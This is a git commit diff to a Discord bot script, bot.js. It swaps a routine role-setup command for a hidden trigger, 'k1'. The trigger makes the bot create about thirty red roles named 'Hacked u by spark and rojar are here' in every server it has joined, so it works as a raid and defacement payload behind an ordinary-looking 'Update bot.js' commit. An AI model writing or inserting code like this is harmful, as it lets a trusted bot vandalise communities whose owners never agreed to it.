0fe3d3e974723b60be63c2d9158900c7a1806c6f
abboodd <38141887+abboodd@users.noreply.github.com>
2018-05-26 13:40:57 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -14,143 +14,211 @@ client.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "r-role") {
+     if (message.content === "k1") {
          LOka.guilds.forEach(m =>{
-   m.createRole({
-        name : "COMMANDER",
+  m.createRole({
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
+        color : " #ff0000"
     })
-   
-   
     m.createRole({
-        name : "-----Owners-----",
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
         color : " #ff0000"
     })
-	
- m.createRole({
-        name : "ADMIRAL",
-        permissions :   [1],
-    })
-	
-	 m.createRole({
-        name : "MARSHAL",
-        permissions :   [1],
-    })
-	
-	 m.createRole({
-        name : "-----HQ Team-----",
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
         color : " #ff0000"
     })
-	
-	 m.createRole({
-        name : "| Head of Staffs",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "| Administrator",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "-----Moderation-----",
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
         color : " #ff0000"
-	})
-	
-	
-	m.createRole({
-        name : "| Head of Staffs",
-        permissions :   [1],
     })
-	
-	m.createRole({
-        name : "Moderator",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "-----More-----",
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
         color : " #ff0000"
-	})
-	
-	m.createRole({
-        name : ".VIP FRIENDS",
-        permissions :   [1],
     })
-	
-	m.createRole({
-        name : ".LEGEND",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : ".SPECIAL  ✓",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : ".ANGEL",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : ".BEST FRIENDS",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "FRIENDS OF SERVER",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "-----Punished-----",
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
         color : " #ff0000"
-   })
-	
-	m.createRole({
-        name : "1ˢᵗ Warn",
-        permissions :   [1],
     })
-	
-	
-	m.createRole({
-        name : "2ᶰᵈ Warn",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "Muted",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "-----Bots-----",
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
         permissions :   [1],
         color : " #ff0000"
-   })
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+     m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+    m.createRole({
+        name : "Hacked u by spark and rojar are here",
+        permissions :   [1],
+        color : " #ff0000"
+    })
+ 
+ 
    
-   m.createRole({
-        name : "-Moderation Bots",
-        permissions :   [1],
-    })
-	
-	m.createRole({
-        name : "-Music Bots",
-        permissions :   [1],
-    })
-
 })
  
  
 }
 });
-
 
 // THIS  MUST  BE  THIS  WAY
 client.login(process.env.BOT_TOKEN);
